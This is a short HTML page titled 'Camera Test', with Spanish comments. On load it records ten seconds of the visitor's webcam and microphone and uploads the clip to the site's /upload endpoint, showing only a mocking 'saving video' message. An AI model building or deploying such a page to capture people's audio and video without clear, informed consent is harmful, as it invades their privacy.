<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Test</title>
    <style>
        body {
            background-color: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        video {
            border: 5px solid red;
        }
        .saving-message {
            color: red;
            font-size: 24px;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            50% {
                opacity: 0;
            }
        }
    </style>
</head>
<body>
    <video id="video" width="640" height="480" autoplay></video>
    <div id="savingMessage" class="saving-message" style="display: none;">GUARDANDO VIDEO ðŸ˜‚</div>
    
    <script>
        const video = document.querySelector('#video');
        const savingMessage = document.querySelector('#savingMessage');
        let mediaRecorder;
        let recordedChunks = [];

        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.srcObject = stream;
                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.start();

                setTimeout(() => {
                    mediaRecorder.stop();
                }, 10000); // Graba por 10 segundos

                mediaRecorder.onstop = async () => {
                    savingMessage.style.display = 'block';
                    await sendVideo();
                    savingMessage.style.display = 'none';
                    video.srcObject.getTracks().forEach(track => track.stop());
                    video.style.display = 'none';
                };
            } catch (error) {
                console.error('Error al acceder a la cÃ¡mara:', error);
            }
        }

        async function sendVideo() {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('video', blob, 'video.webm');

            try {
                const response = await fetch('/upload', { method: 'POST', body: formData });
                const result = await response.json();
                console.log('Video subido con Ã©xito:', result);
            } catch (error) {
                console.error('Error al subir el video:', error);
            }
        }

        window.onload = startRecording;
    </script>
</body>
</html>
